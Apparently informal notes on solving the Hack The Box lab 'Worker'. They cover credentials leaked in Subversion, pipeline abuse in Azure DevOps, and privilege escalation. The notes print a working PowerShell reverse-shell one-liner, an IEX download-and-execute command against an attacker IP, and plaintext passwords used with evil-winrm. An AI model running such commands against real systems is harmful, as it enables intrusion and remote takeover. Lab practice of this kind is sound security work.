A iam able to download a project website based on Dimension by 5Up
A page contains several "domains" that need to be added to my /etc/hosts
The subdomains did not yeild anything intresting
Fuzzing for more subdomains that could exist


Found another subdomain
http://devops.worker.htb

Found in Subversion revision 2 in deploy.ps1
$user = "nathen" 
$plain = "wendel98"

My user has the power to create a new pull request for the spectral project
to add data to the repo that are pushed online through the pipeline.
We will use that to upload a reverse shell online


powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.70',1818);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush() };$client.Close()"

powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.46:8000/rs.ps1')

initial dir = C:\windows\system32\inetsrv
we are in as iis




if we move to W:// we can see azure related data as well as the sites
lets look into it


found a bunch of passwords user pairs in W:\svnrepos\www\conf

I can connect as robisl with evil-winrm
evil-winrm -i 10.10.10.203 -u robisl -p wolves11
robisl = wolves11



I can log in as robisl to the devops.
Then i can create my own pipeline in which i command is executed as root
set up a listener to upload and execute my shell
wget http://10.10.14.70:8000/winPEAS.exe -OutFile winPEAS.exe
